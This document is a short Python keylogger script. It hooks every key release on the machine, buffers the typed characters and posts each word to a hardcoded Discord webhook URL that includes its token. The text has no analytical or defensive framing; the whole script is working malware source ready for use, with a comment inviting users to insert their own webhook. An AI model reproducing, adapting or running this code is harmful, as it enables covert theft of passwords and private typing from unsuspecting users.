import time
import keyboard
import requests

WEBHOOK_URL = 'https://discord.com/api/webhooks/1320027493364928703/5ev0fIuiKUuqz3HFHDyvUqtCvaFqtpEaKQCPRu-WAb6rqP7RFuZT4pW-NSu4JCHYaRWY' #place your webhook url here
keylogs = []

def send_keylogs():
    global keylogs
    if keylogs:
        word = ''.join(keylogs)
        payload = {
            'content': word
        }
        requests.post(WEBHOOK_URL, data=payload)
        keylogs = []  

def cap(event):
    global keylogs
    if event.name == 'space':
        send_keylogs()
    elif event.name == 'backspace':
        if keylogs: 
            keylogs.pop()  
    else:
        keylogs.append(event.name)

keyboard.on_release(callback=cap)
while True:
    time.sleep(1)
